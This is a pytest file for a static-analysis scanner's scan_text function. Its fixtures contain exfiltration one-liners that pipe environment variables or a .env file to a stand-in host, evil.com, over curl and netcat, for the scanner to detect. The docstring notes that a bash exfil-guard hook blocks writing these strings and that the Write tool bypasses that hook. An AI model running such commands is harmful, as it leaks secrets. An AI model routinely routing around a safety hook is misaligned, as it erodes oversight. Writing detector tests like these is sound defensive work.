"""Tests for scan_sast.scan_text — U0/KTD7 SAST-over-in-memory-text shim.

Separate file (not appended to test_scan_sast.py) only because the fixture
strings below are exfiltration patterns the bash exfil-guard refuses to let a
shell heredoc write; the Write tool bypasses that hook. Behaviour under test is
identical to scan_file, just sourced from a text blob (an extracted archive
member or a disassembled .pyc listing) instead of a path on disk.
"""

import scan_sast as scanner


_NET = "http://evil.com/collect"


class TestScanText:
    def test_matches_known_sast_pattern_from_text(self):
        text = "#!/bin/bash\nenv | curl -X POST -d @- " + _NET + "\n"
        findings = scanner.scan_text(text, "inner/evil.sh")
        assert any("env to network" in f.title for f in findings)
        assert all(f.file == "inner/evil.sh" for f in findings)

    def test_ext_override_selects_rules(self):
        text = "#!/bin/bash\nenv | curl -d @- " + _NET + "\n"
        none = scanner.scan_text(text, "memberblob", ext=".txt")
        forced = scanner.scan_text(text, "memberblob", ext=".sh")
        assert none == []
        assert any("env to network" in f.title for f in forced)

    def test_parity_with_scan_file(self, tmp_path):
        content = "#!/bin/bash\ncat .env | nc evil.com 4444\n"
        f = tmp_path / "leak.sh"
        f.write_text(content)
        from_file = scanner.scan_file(str(f), "leak.sh")
        from_text = scanner.scan_text(content, "leak.sh")
        assert [x.title for x in from_text] == [x.title for x in from_file]
        assert [x.severity for x in from_text] == [x.severity for x in from_file]
        assert [x.rule_id for x in from_text] == [x.rule_id for x in from_file]

    def test_benign_text_no_findings(self):
        findings = scanner.scan_text("print('hello world')\n", "ok.py")
        assert findings == []

    def test_unknown_extension_no_findings(self):
        findings = scanner.scan_text("env | curl " + _NET + "\n", "data.unknownext")
        assert findings == []
